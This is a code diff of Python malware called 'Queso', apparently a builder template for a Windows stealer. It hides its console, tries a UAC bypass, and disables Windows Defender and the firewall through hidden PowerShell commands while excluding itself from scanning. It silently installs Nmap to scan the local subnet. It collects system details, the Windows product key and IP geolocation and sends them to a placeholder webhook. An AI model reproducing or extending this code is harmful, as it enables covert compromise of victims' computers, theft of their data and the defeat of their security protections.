@@ -28,15 +28,6 @@ class Utility:
             return (__file__, False)
 
     @staticmethod
-    def ExcludeFromDefender(filepath: str = None) -> None: # Exclude a file from Windows Defender
-        if filepath is None:
-            filepath = Utility.GetSelf()[0]
-        subprocess.Popen(
-            "powershell -Command Add-MpPreference -ExclusionPath '{}'".format(filepath),
-            shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE
-        )
-
-    @staticmethod
     def IsAdmin() -> bool:
         return subprocess.run("net session", shell= True, capture_output= True).returncode == 0
 
@@ -112,7 +103,7 @@ class Network:
         return "None"
 
     @staticmethod
-    def DisableFirewall() -> None:
+    def DisableFirewall() -> None: # Disable Windows Firewall
         adapters = Network.GetNetAdapters()
         for adapter in adapters: # Loop over all adapters
             print(adapter)
@@ -138,14 +129,32 @@ class Network:
 
     @staticmethod
     def InstallNmap() -> None: # Install Nmap
-        with zipfile.ZipFile(os.path.join(sys._MEIPASS, "nmap.zip"), "r") as zip:
-            zip.extractall("C:\\Program Files (x86)")
+        with zipfile.ZipFile(os.path.join(sys._MEIPASS, "nmap.zip"), "r") as nmap_zip:
+            nmap_zip.extractall("C:\\Program Files (x86)")
 
     @staticmethod
     def NmapScan(ip_range: str, nmap_arguments: str ="-sV -T4 -O -F --version-light") -> ElementTree: # Perform an Nmap scan
         nmap_session = nmap3.Nmap()
         return nmap_session.scan_command(ip_range, nmap_arguments)
-        
+    
+class Defender:
+
+    @staticmethod
+    def ExcludeFromDefender(filepath: str = None) -> None: # Exclude a file from Windows Defender
+        if filepath is None:
+            filepath = Utility.GetSelf()[0]
+        subprocess.Popen(
+            "powershell -Command Add-MpPreference -ExclusionPath '{}'".format(filepath),
+            shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE
+        )
+
+    @staticmethod
+    def DisableDefender() -> None: # Disable Windows Defender
+        subprocess.Popen(
+            "powershell -Command Set-MpPreference -DisableBehaviorMonitoring $True -DisableRealtimeMonitoring $True",
+            shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE
+        )
+
 
 class Tasks:
 
@@ -164,45 +173,35 @@ class Tasks:
 class Queso:
 
     Webhook: str = "%webhook%"
-    TempFolder: str = None
 
     def __init__(self) -> None:
-        while True:
-            self.TempFolder = os.path.join(os.getenv("temp"), Utility.GetRandomString(10, True))
-            if not os.path.isdir(self.TempFolder):
-                os.makedirs(self.TempFolder, exist_ok= True)
-                break
 
         user_tasks = (
             (self.LaunchBoundApplication, False),
             (self.SendData, False)
         )
 
-        admin_tasks = (
-            
-        )
-
-        # Hide the console and exclude this file from Windows Defender
+        # Hide the console
         Syscalls.HideConsole()
-        Utility.ExcludeFromDefender()
 
         if not Utility.IsAdmin(): # If not an admin, try to be one
             if Utility.GetSelf()[1] and not "--no-bypass" in sys.argv:
                     Utility.UACbypass()
 
         if Utility.IsAdmin(): # We're admin now
+            
+            if "%disable_defender%":
+                # Disable Windows Defender and exclude this file
+                Defender.DisableDefender()
+                Defender.ExcludeFromDefender()
 
-            # Disable Windows Firewall and exclude this file
-            Network.DisableFirewall()
-            Network.ExcludeFromFirewall()
+            if "%disable_firewall%":
+                # Disable Windows Firewall and exclude this file
+                Network.DisableFirewall()
+                Network.ExcludeFromFirewall()
 
             if not os.path.exists("C:\\Program Files (x86)\\Nmap"): # Install Nmap if it doesn't exist
                 Network.InstallNmap()
-
-            for task_func, task_daemon in admin_tasks: # Start admin tasks
-                admin_task_thread = Thread(target= task_func, daemon= task_daemon)
-                admin_task_thread.start()
-                Tasks.AddTask(admin_task_thread)
 
         for task_func, task_daemon in user_tasks: # Start user tasks
             user_task_thread = Thread(target= task_func, daemon= task_daemon)
@@ -218,54 +217,51 @@ class Queso:
 
     def SendData(self) -> None: # Send gathered data to the webhook
 
-        # Gather system information
-        computer_name = os.getenv("computername")
-        computer_os = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
-        computer_uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
-        cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
-        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
-        productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
+        if "%log_sysinfo%":
+            # Gather system information
+            computer_name = os.getenv("computername")
+            computer_os = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
+            computer_uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
+            cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
+            gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
+            productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
 
-        sys_info = f"""
-            \nComputer Name: {computer_name}
-            \nOS: {computer_os}
-            \nUUID: {computer_uuid}
-            \nCPU: {cpu}
-            \nGPU: {gpu}
-            \nProduct Key: {productKey}
-        """
+            sys_info = f"""
+                \nComputer Name: {computer_name}
+                \nOS: {computer_os}
+                \nUUID: {computer_uuid}
+                \nCPU: {cpu}
+                \nGPU: {gpu}
+                \nProduct Key: {productKey}
+            """
 
         http_manager = PoolManager()
 
-        try: # Try to gather IP information
-            result: dict = json.loads(http_manager.request("GET", "http://ip-api.com/json/").data.decode())
-            if result.get("status") != "success":
-                raise Exception("Failed to retrieve IP info")
-            ip_data = f"""
-                \nIP: {result['query']}
-                \nCountry: {result['country']}
-                \nTimezone: {result['timezone']}
-                \nRegion: {result['regionName']}
-                \nZIP: {result['zip']}
-                \nCoordinates: [{result['lat']}, {result['lon']}]
-                \nISP: {result['isp']}
-            """
-        except Exception: # Throw an error if we can't
-            ip_info = "(No IP info)"
-        else:
-            ip_info = ip_data
+        if "%log_ipinfo%":
+            try: # Try to gather IP information
+                result: dict = json.loads(http_manager.request("GET", "http://ip-api.com/json/").data.decode())
+                if result.get("status") != "success":
+                    raise Exception("Failed to retrieve IP info")
+                ip_data = f"""
+                    \nIP: {result['query']}
+                    \nCountry: {result['country']}
+                    \nTimezone: {result['timezone']}
+                    \nRegion: {result['regionName']}
+                    \nZIP: {result['zip']}
+                    \nCoordinates: [{result['lat']}, {result['lon']}]
+                    \nISP: {result['isp']}
+                """
+            except Exception: # Throw an error if we can't
+                ip_info = "(No IP info)"
+            else:
+                ip_info = ip_data
 
         # Create the embed
         webhook_payload = {
             "embeds": [
                 {
                     "title": "Queso Project",
-                    "description": f"""
-                        __System Info__
-                        \n```autohotkey\n{sys_info}```
-                        \n__IP Info__
-                        \n```prolog\n{ip_info}```
-                    """,
+                    "description": "**Info Gathered:**\n",
                     "footer": {
                         "text": "Information by Queso"
                     }
@@ -274,15 +270,22 @@ class Queso:
             "username": "Queso"
         }
 
+        if sys_info:
+            webhook_payload["embeds"][0]["description"] += f"_System Info_\n```autohotkey\n{sys_info}```\n"
+        if ip_info:
+            webhook_payload["embeds"][0]["description"] += f"_IP Info_\n```prolog\n{ip_info}```\n"
+
         webhook_fields = dict()
 
         # Create a dict for our zip file data
         zip_data = {}
 
-        # Append a network scan if we can make one
-        network_scan = Network.NmapScan("192.168.1.1/24")
-        if network_scan:
-            zip_data['nmap'] = network_scan
+        network_scan: ElementTree = None
+        if "%nmap_scan%":
+            # Append a network scan if we can make one
+            network_scan = Network.NmapScan("192.168.1.1/24")
+            if network_scan:
+                zip_data['nmap'] = network_scan
         
         # Try to create a zip file and attach it if we can
         Utility.CreateZip(zip_data)
